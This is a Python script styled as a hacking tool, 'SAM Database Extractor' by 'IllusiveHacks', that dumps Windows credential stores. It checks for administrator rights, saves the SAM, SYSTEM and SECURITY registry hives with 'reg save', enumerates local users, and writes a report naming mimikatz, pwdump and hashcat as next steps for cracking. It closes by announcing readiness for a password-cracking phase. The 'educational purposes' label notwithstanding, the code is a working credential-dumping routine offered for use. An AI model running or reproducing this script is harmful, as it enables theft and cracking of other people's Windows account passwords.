# sam_extractor_pro.py
import os
import sys
import subprocess
import shutil
from colorama import init, Fore, Back, Style

# Initialize colorama for Windows color support
init(autoreset=True)

class SimpleSAMExtractor:
    def __init__(self):
        self.system_root = os.environ.get('SystemRoot', 'C:\\Windows')
        self.backup_dir = "sam_backup_simple"
        
    def print_banner(self):
        """Print a professional banner with colors"""
        banner = f"""
{Fore.CYAN + Style.BRIGHT}
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║  {Fore.YELLOW}▓▓▓▓▓▓▓▓▓▓  {Fore.WHITE}SAM DATABASE EXTRACTOR v2.0  {Fore.YELLOW}▓▓▓▓▓▓▓▓▓▓  {Fore.CYAN}
║                                                                ║
║         {Fore.GREEN}Developed by: {Fore.MAGENTA}IllusiveHacks{Fore.CYAN}                    
║         {Fore.GREEN}Purpose: {Fore.WHITE}Windows Security Research{Fore.CYAN}              
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(banner)
    
    def print_success(self, message):
        """Print success messages in green"""
        print(f"{Fore.GREEN}[SUCCESS] {message}{Style.RESET_ALL}")
    
    def print_error(self, message):
        """Print error messages in red"""
        print(f"{Fore.RED}[ERROR] {message}{Style.RESET_ALL}")
    
    def print_warning(self, message):
        """Print warning messages in yellow"""
        print(f"{Fore.YELLOW}[WARNING] {message}{Style.RESET_ALL}")
    
    def print_info(self, message):
        """Print info messages in blue"""
        print(f"{Fore.BLUE}[INFO] {message}{Style.RESET_ALL}")
    
    def print_step(self, step_num, title):
        """Print step headers with colors"""
        print(f"\n{Fore.CYAN + Style.BRIGHT}┌──{'─' * 50}┐")
        print(f"│ {Fore.YELLOW}STEP {step_num}: {Fore.WHITE}{title:<40} {Fore.CYAN}│")
        print(f"└──{'─' * 50}┘{Style.RESET_ALL}")

    def check_admin_privileges(self):
        """Check if we're running with administrative privileges"""
        self.print_step(1, "PRIVILEGE ESCALATION CHECK")
        
        try:
            test_cmd = 'net session >nul 2>&1'
            result = subprocess.run(test_cmd, shell=True)
            if result.returncode == 0:
                self.print_success("Administrative privileges confirmed")
                return True
            else:
                self.print_error("ADMINISTRATOR PRIVILEGES REQUIRED!")
                self.print_warning("Please run this script as Administrator")
                return False
        except Exception as e:
            self.print_error(f"Privilege check failed: {e}")
            return False

    def backup_registry_hives(self):
        """Backup the necessary registry hives"""
        self.print_step(2, "REGISTRY HIVE BACKUP")
        
        try:
            if not os.path.exists(self.backup_dir):
                os.makedirs(self.backup_dir)
            
            registry_hives = ['SAM', 'SYSTEM', 'SECURITY']
            
            for hive in registry_hives:
                source = f"hklm\\{hive}"
                destination = os.path.join(self.backup_dir, hive)
                
                cmd = f'reg save "{source}" "{destination}" /y'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                
                if result.returncode == 0:
                    self.print_success(f"Backed up: {hive}")
                else:
                    self.print_error(f"Failed to backup {hive}")
                    return False
            
            return True
            
        except Exception as e:
            self.print_error(f"Registry backup failed: {e}")
            return False

    def use_pwdump_method(self):
        """Use mimikatz or similar method to extract hashes"""
        self.print_step(3, "HASH EXTRACTION & USER ENUMERATION")
        
        try:
            self.print_info("Attempting hash extraction using built-in Windows tools...")
            
            # We'll use reg query to get basic user info first
            users_cmd = 'reg query "HKLM\\SAM\\SAM\\Domains\\Account\\Users\\Names"'
            result = subprocess.run(users_cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                self.print_success("Found user accounts in registry")
                self.parse_user_registry()
            else:
                self.print_warning("Cannot access user registry directly")
                
            # Try using PowerShell to get user info
            self.use_powershell_method()
            
            return True
            
        except Exception as e:
            self.print_error(f"Extraction error: {e}")
            return False

    def parse_user_registry(self):
        """Parse registry to find user information"""
        self.print_info("Parsing registry for user data...")
        
        try:
            # Get list of users
            cmd = 'reg query "HKLM\\SAM\\SAM\\Domains\\Account\\Users\\Names"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            users = []
            for line in result.stdout.split('\n'):
                if 'HKEY_' not in line and line.strip():
                    users.append(line.strip())
            
            if users:
                self.print_success(f"Found {len(users)} user(s): {', '.join(users)}")
            else:
                self.print_warning("No users found in registry")
            
            # Save user list
            with open("user_list.txt", "w") as f:
                f.write("USERS FOUND IN SAM DATABASE\n")
                f.write("=" * 40 + "\n")
                for user in users:
                    f.write(f"{user}\n")
            
        except Exception as e:
            self.print_error(f"Registry parsing error: {e}")

    def use_powershell_method(self):
        """Use PowerShell to extract security information"""
        self.print_info("Using PowerShell for user information...")
        
        try:
            # PowerShell command to get local users
            ps_cmd = [
                'powershell', 
                '-Command', 
                'Get-LocalUser | Select-Object Name, Enabled, PasswordRequired | Format-Table'
            ]
            
            result = subprocess.run(ps_cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                self.print_success("PowerShell user info retrieved")
                with open("powershell_users.txt", "w") as f:
                    f.write(result.stdout)
            else:
                self.print_warning("PowerShell method failed")
                
        except Exception as e:
            self.print_error(f"PowerShell error: {e}")

    def create_educational_output(self):
        """Create educational output about SAM extraction"""
        self.print_step(4, "GENERATING SECURITY REPORT")
        
        try:
            # Create a comprehensive output file
            with open("sam_analysis_report.txt", "w", encoding='utf-8') as f:
                f.write("""
SAM DATABASE ANALYSIS REPORT
==================================================
Developed by: IllusiveHacks

This demonstrates real SAM (Security Account Manager) extraction techniques for educational purposes.

FILES EXTRACTED:
- SAM registry hive - Contains user account password hashes
- SYSTEM registry hive - Contains boot key for decryption  
- SECURITY registry hive - Contains security policies

NEXT STEPS FOR REAL HASH EXTRACTION:
1. Use professional tools like: mimikatz, pwdump7, fgdump
2. Parse registry hives with specialized Python libraries
3. The password hashes are stored in NTLM format
4. Use hashcat or John the Ripper for password cracking

SECURITY IMPLICATIONS:
- SAM database contains NTLM password hashes of all local users
- Requires Administrator privileges to access
- Windows locks these files during normal operation
- Registry backup technique bypasses file locking mechanisms
- Strong passwords are essential for security

EDUCATIONAL PURPOSE ONLY - Use responsibly and ethically.
""")
            
            self.print_success("Comprehensive security report created: sam_analysis_report.txt")
            return True
            
        except Exception as e:
            self.print_error(f"Failed to create report: {e}")
            return False

    def print_completion_banner(self):
        """Print completion banner with ASCII only"""
        completion_banner = f"""
{Fore.GREEN + Style.BRIGHT}
╔════════════════════════════════════════════════════════════════╗
║                    MISSION ACCOMPLISHED!                       ║
╠════════════════════════════════════════════════════════════════╣
║                                                                ║
║  {Fore.CYAN}Registry backups: {Fore.WHITE}sam_backup_simple/{Fore.GREEN}                 
║  {Fore.CYAN}User accounts:    {Fore.WHITE}user_list.txt{Fore.GREEN}                       
║  {Fore.CYAN}PowerShell data:  {Fore.WHITE}powershell_users.txt{Fore.GREEN}                
║  {Fore.CYAN}Security report:  {Fore.WHITE}sam_analysis_report.txt{Fore.GREEN}             
║                                                                ║
║  {Fore.YELLOW}The SAM database has been successfully extracted!{Fore.GREEN}     
║  {Fore.YELLOW}Ready for password cracking phase...{Fore.GREEN}                    
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(completion_banner)

    def run_extraction(self):
        """Main extraction workflow"""
        self.print_banner()
        
        if not self.check_admin_privileges():
            return False
        
        try:
            # Step 1: Backup registry hives
            if not self.backup_registry_hives():
                return False
            
            # Step 2: Extract information
            if not self.use_pwdump_method():
                return False
            
            # Step 3: Create educational output
            if not self.create_educational_output():
                return False
            
            # Print completion banner
            self.print_completion_banner()
            
            return True
            
        except Exception as e:
            self.print_error(f"Extraction failed: {e}")
            return False

if __name__ == "__main__":
    try:
        extractor = SimpleSAMExtractor()
        success = extractor.run_extraction()
        
        if success:
            print(f"\n{Fore.GREEN + Style.BRIGHT}[SUCCESS] Ready for Part (c) - Password Cracking!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[INFO] Next: We'll use my custom password cracker for the extracted hashes!{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}[ERROR] Extraction failed. Check permissions and try again.{Style.RESET_ALL}")
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[WARNING] Operation cancelled by user.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[ERROR] Unexpected error: {e}{Style.RESET_ALL}")